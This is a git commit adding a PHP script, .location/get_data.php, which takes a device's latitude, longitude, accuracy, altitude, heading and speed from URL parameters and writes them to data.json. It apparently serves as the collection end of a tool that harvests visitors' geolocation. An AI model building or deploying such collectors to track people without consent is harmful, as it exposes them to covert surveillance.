aa87cb2ef4ca5009449cb80d2014d7f1cd89c444
ToxicNoob <ToxicNoob.Sl4d3.Official@gmail.com>
2022-03-02 21:22:39 +0600

    Add files via upload

---
+++ .location/get_data.php
@@ -0,0 +1,28 @@
+<?php
+header('Content-Type: text/html');
+error_log("Received" . "\r\n", 3, "Log.log");
+{
+  $lat = $_GET['Lat'];
+  $lon = $_GET['Lon'];
+  $acc = $_GET['Acc'];
+  $alt = $_GET['Alt'];
+  $dir = $_GET['Dir'];
+  $spd = $_GET['Spd'];
+
+  $data['info'] = array();
+
+  $data['info'][] = array(
+    'lat' => $lat,
+    'lon' => $lon,
+    'acc' => $acc,
+    'alt' => $alt,
+    'dir' => $dir,
+    'spd' => $spd);
+
+  $jdata = json_encode($data);
+
+  $f = fopen('data.json', 'w+');
+  fwrite($f, $jdata);
+  fclose($f);
+}
+?>
